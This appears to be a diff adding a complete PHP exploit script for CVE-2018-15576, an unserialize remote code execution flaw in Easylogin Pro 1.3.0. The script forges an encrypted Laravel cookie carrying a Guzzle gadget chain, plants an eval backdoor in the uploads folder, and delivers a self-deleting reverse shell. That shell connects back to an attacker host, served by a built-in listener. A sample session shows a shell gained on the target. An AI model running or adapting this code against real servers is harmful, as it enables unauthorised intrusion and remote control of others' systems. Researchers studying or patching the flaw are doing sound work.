@@ -1,0 +1,377 @@
+#!/usr/bin/php
+<?php
+/*
+Easylogin Pro Encryptor.php Unserialize Remote Code Execution Vulnerability
+Version: 1.3.0
+Platform: Ubuntu Server 18.04.1 
+
+Bug found by: @f99942
+Tekniq/exploit by: @steventseeley (mr_me)
+CVE: CVE-2018-15576
+
+Notes:
+======
+
+- This is not really a security issue I guess, because you need to know the key. 
+  But a simple disclosure bug could mean its game over for Easylogin Pro
+- You will need PHP with threading support to run this exploit
+- Laravel + Guzzle === lol
+
+Example:
+========
+
+mr_me@pluto:~$ php -m | grep pthreads && php --version
+pthreads
+PHP 7.2.2 (cli) (built: Aug 10 2018 01:30:10) ( ZTS DEBUG )
+Copyright (c) 1997-2018 The PHP Group
+Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
+    with Zend OPcache v7.2.2, Copyright (c) 1999-2018, by Zend Technologies
+
+mr_me@pluto:~$ ./e.php 
+
+Easylogin Pro <= v1.3.0 Encryptor.php Unserialize Remote Code Execution Vulnerability
+Bug found by: @f99942
+Tekniq/exploit by: @steventseeley (mr_me)
+
+----------------------------------------------------
+Usage: php ./e.php -t <ip> -c <ip:port>
+-t:      target server (ip with or without port)
+-c:      connectback server (ip and port)
+Example:
+php ./e.php -t 172.16.175.136 -c 172.16.175.137:1337
+----------------------------------------------------
+mr_me@pluto:~$ ./e.php -t 172.16.175.137 -c 172.16.175.136:1337
+
+Easylogin Pro <= v1.3.0 Encryptor.php Unserialize Remote Code Execution Vulnerability
+bug found by: @f99942
+tekniq/exploit by: @steventseeley (mr_me)
+
+(+) snap...
+(+) crackle...
+(+) pop!
+(+) connectback from 172.16.175.137 via port 41860
+
+www-data@target:/var/www/html/uploads$ id;uname -a
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux target 4.15.0-30-generic #32-Ubuntu SMP Thu Jul 26 17:42:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+www-data@target:/var/www/html/uploads$ ls -la
+total 12
+drwxrwxrwx 2 www-data www-data 4096 Aug 12 23:06 .
+drwxr-xr-x 9 www-data www-data 4096 Aug  9 14:49 ..
+-rwxrwxrwx 1 root     root       13 Dec 12  2017 .gitignore
+www-data@target:/var/www/html/uploads$ php --version
+PHP 7.2.7-0ubuntu0.18.04.2 (cli) (built: Jul  4 2018 16:55:24) ( NTS )
+Copyright (c) 1997-2018 The PHP Group
+Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
+    with Zend OPcache v7.2.7-0ubuntu0.18.04.2, Copyright (c) 1999-2018, by Zend Technologies
+www-data@target:/var/www/html/uploads$
+*/
+
+namespace GuzzleHttp\Cookie;
+
+// change these to work against your target
+$key  = "OPudCtPyxzAGw8LkQowOoQAc88dvULGB";
+$path = "/var/www/html";
+ 
+class Encrypter {
+    protected $key;
+    protected $cipher;
+
+    public function __construct($key, $cipher = 'AES-256-CBC'){
+        $key = (string) $key;
+        $this->key = $key;
+        $this->cipher = $cipher;
+    }
+
+    public function encrypt($value, $serialize = true){
+        $iv = random_bytes(openssl_cipher_iv_length($this->cipher));
+        $value = openssl_encrypt(
+            $serialize ? serialize($value) : $value,
+            $this->cipher, $this->key, 0, $iv
+        );
+        if ($value === false) {
+            throw new EncryptException('Could not encrypt the data.');
+        }
+        $mac = $this->hash($iv = base64_encode($iv), $value);
+        $json = json_encode(compact('iv', 'value', 'mac'));
+        if (json_last_error() !== JSON_ERROR_NONE) {
+            throw new EncryptException('Could not encrypt the data.');
+        }
+        return base64_encode($json);
+    }
+
+    public function encryptString($value){
+        return $this->encrypt($value, false);
+    }
+
+    protected function hash($iv, $value){
+        return hash_hmac('sha256', $iv.$value, $this->key);
+    }
+}
+
+// pop chain
+interface ToArrayInterface {}
+
+class SetCookie implements ToArrayInterface {
+    private $data;
+
+    public function __construct(array $data = []){
+        $this->data = $data;
+    }
+}
+
+class CookieJar implements ToArrayInterface {
+    private $cookies;
+
+    public function setCookie(SetCookie $cookie){
+        $this->cookies = array($cookie);
+    }
+}
+
+class FileCookieJar extends CookieJar {
+    private $filename;
+
+    public function __construct($bd_file, $cbh, $cbp){
+        $this->filename = $bd_file;
+        $this->setCookie(new SetCookie(array(
+            "Value" => '<?php eval(base64_decode($_SERVER[HTTP_SI])); ?>', 
+            "Expires" => true,
+            "Discard" => false,
+        ))); 
+    }
+}
+
+class Exploit{
+    private $target;
+    private $targetport;
+    private $cbhost;
+    private $cbport;
+    private $key;
+    private $path;
+
+    public function __construct($t, $tp, $cbh, $cbp, $k, $p){
+        $this->target     = $t;
+        $this->targetport = $tp;
+        $this->cbhost     = $cbh;
+        $this->cbport     = $cbp;
+        $this->key        = $k;
+        $this->path       = $p;
+    }
+
+    public function run(){
+
+        // its possible to leak the path if app.php contains 'debug' => true
+        // also, uploads is writable by default for avatars
+        $fcj = new FileCookieJar("$this->path/uploads/si.php", $this->cbhost, $this->cbport);
+        $e   = new Encrypter($this->key);
+        $this->p = $e->encryptString(serialize($fcj));
+
+        // hardcoded md5 of the class name 'Hazzard\Auth\Auth' for the cookie login 
+        $c = $this->do_get("index.php", array("Cookie: login_ac5456751dd3c394383a14228642391e=$this->p"));
+        if ($c === 500){
+            print "(+) pop!\r\n";
+
+            // start our listener
+            $s = new Shell($this->cbport); 
+            $s->start();
+
+            // msf reverse shell with some stuff modified
+            $rs = <<<'PHP'
+@error_reporting(-1);
+@set_time_limit(0); 
+@ignore_user_abort(1);
+$dis=@ini_get('disable_functions');
+if(!empty($dis)){
+    $dis=preg_replace('/[, ]+/', ',', $dis);
+    $dis=explode(',', $dis);
+    $dis=array_map('trim', $dis);
+}else{
+    $dis=array();
+}
+$ipaddr='[cbhost]';
+$port=[cbport];
+function PtdSlhY($c){
+    global $dis; 
+    if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
+        $c=$c." 2>&1\n";
+    }
+    ob_start();
+    system($c);
+    $o=ob_get_contents();
+    ob_end_clean();
+    if (strlen($o) === 0){
+        $o = "NULL";
+    }
+    return $o;
+}
+// we disappear like a fart in the wind
+@unlink("si.php");
+$nofuncs='no exec functions';
+$s=@fsockopen("tcp://$ipaddr",$port);
+while($c=fread($s,2048)){
+    $out = '';
+    if(substr($c,0,3) == 'cd '){
+        chdir(substr($c,3,-1));
+    }else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+        break;
+    }else{
+        $out=PtdSlhY(substr($c,0,-1));
+        if($out===false){
+            fwrite($s, $nofuncs);
+            break;
+        }
+    }
+    fwrite($s,$out);
+}
+fclose($s);
+PHP;
+            $rs = str_replace("[cbhost]", $this->cbhost, $rs);
+            $rs = str_replace("[cbport]", $this->cbport, $rs);
+            $php = base64_encode($rs);
+            $this->do_get("uploads/si.php", array("si: $php"));
+        }
+    }
+
+    private function do_get($p = "index.php", array $h = []){
+        $curl = curl_init();
+        curl_setopt_array($curl, array(
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_URL => "http://$this->target/$p",
+            CURLOPT_HTTPHEADER => $h,
+            CURLOPT_PORT => (int) $this->targetport
+        ));
+        $resp = curl_exec($curl);
+        return curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    }
+}
+
+class Shell extends \Thread{
+    private $cbport;
+
+    public function __construct($cbp){
+        $this->cbport = $cbp;
+    }
+
+    public function run(){ 
+        $sock    = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        $ret     = @socket_bind($sock, 0, (int) $this->cbport);
+        $ret     = @socket_listen($sock, 5);
+        $msgsock = @socket_accept($sock);
+        @socket_close($sock);
+        $start = true;
+        $fp = fopen("php://stdin", "r");
+        while(false !== @socket_select($r = array($msgsock))){
+            if ($start === true){
+                if (socket_getpeername($r[0], $a, $p) === true){
+                    print "(+) connectback from $a via port $p\r\n";
+                    $s = $this->exec_cmd($msgsock, "echo `whoami`@`hostname`:\n");
+                }
+            }
+            $start = false;
+
+            // the pretty shells illusion
+            print "\r\n".$s.$this->exec_cmd($msgsock, "echo `pwd`\n")."$ ";
+
+            // get our command...
+            $c = fgets($fp);
+
+            // if the attacker enters nothing, continue...
+            if (strpos("\n", $c) === 0){
+                continue;
+            }
+            if (strpos($c, "cd") === false){
+                print $this->exec_cmd($msgsock, $c);
+            }elseif (strpos($c, "cd") !== false){
+                $this->exec_cmd($msgsock, $c, false);
+            }
+            if(in_array($c, array("exit\n", "quit\n"))){
+                break;
+            }
+        }
+        fclose($fp);
+    }
+
+    private function exec_cmd($c, $cmd, $ret=true){
+
+            // send our command to the reverse shell
+            @socket_write($c, $cmd, strlen($cmd));
+
+            if ($ret == true){
+                // we don't care to get the shell prompt back...
+                $resp = trim(@socket_read($c, 2048, PHP_BINARY_READ));
+                if ($resp === "NULL"){
+                    return "";
+                }else{
+                    return $resp;
+                }
+            }
+    }
+}
+
+print_r("\r\nEasylogin Pro <= v1.3.0 Encryptor.php Unserialize Remote Code Execution Vulnerability
+Bug found by: @f99942
+Tekniq/exploit by: @steventseeley (mr_me)\r\n");
+ 
+if ($argc < 3) {
+print_r("
+----------------------------------------------------
+Usage: php ".$argv[0]." -t <ip> -c <ip:port>
+-t:      target server (ip with or without port)
+-c:      connectback server (ip and port)
+Example:
+php ".$argv[0]." -t 172.16.175.136 -c 172.16.175.137:1337
+----------------------------------------------------
+"); die; }
+
+function set_args($argv) {
+    $_ARG = array();
+    foreach ($argv as $arg) {
+        if (preg_match("/--([^=]+)=(.*)/", $arg, $reg)) {
+            $_ARG[$reg[1]] = $reg[2];
+        } elseif(preg_match("/^-([a-zA-Z0-9])/", $arg, $reg)) {
+            $_ARG[$reg[1]] = "true";
+        } else {
+            $_ARG["input"][] = $arg;
+        }
+    }
+    return $_ARG;
+}
+ 
+$args = set_args($argv);
+$host = $args["input"]["1"];
+$cbsp = $args["input"]["2"];
+ 
+if (strpos($host, ":") == true){
+    $host_and_port = explode(":", $host);
+    $host = $host_and_port[0];
+    $port = $host_and_port[1];
+}else{
+    $port = 80;
+}
+
+if (strpos($cbsp, ":") == true){
+    $cbhost_and_cbport = explode(":", $cbsp);
+    $cbhost = $cbhost_and_cbport[0];
+    $cbport = $cbhost_and_cbport[1];
+}else{
+    $cbport = 1337;
+}
+
+$ip_regex = "(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)";
+if ((preg_match($ip_regex, $host) === 1) && (preg_match($ip_regex, $cbhost) === 1)){
+
+    // exploit entry
+    $poc = new Exploit($host, $port, $cbhost, $cbport, $key, $path);
+    print "\r\n(+) snap...\r\n(+) crackle...\r\n";
+    $poc->run();
+}
+/*
+eyJpdiI6InFGcWFDMW9aMEFwWmo2XC9RRkhxZ3JBPT0iLCJ2YWx1ZSI6IjdpVExUQWpaYVpu
+RjVVRElxczg1YUVpSWl2bEtXOVwvY3BVaDFkc0NNY0Y4NkhMME9XNE9PZHJxc0FhUFBlenpi
+VWtJSUNHWE9RYU5MQjVnOUgzUkt4RGc0QlE4TDNZSnpueFZlblVjM3NnVXFmeE0zSnZaRFA2
+a2gxU1l2QlVYNW5pUkZEd3c2RFJWYnpqRFkyUmdOQW5vZkVtaFA0Y2JDRW1kUU5mNWtGdmh3
+WDJWYlBmQU0rTkFwWExQOERWcEZDVTYzU255VEFaTzN4MzhZTEUxWElRbnNCZ1grWm9rN3Vh
+MzBzSnYrSGpjMmlRRWMxZWVTbDVhN29uOG1RazBJIiwibWFjIjoiOThmYTM5ZDc3M2FlMGVh
+NTI3ZWI2ZGNkODQ5N2ZmZmExNDA3YjdjYzYzMGRlODY3NDZmMjRkYTBiNmVjMGJmMCJ9
+*/
+?>
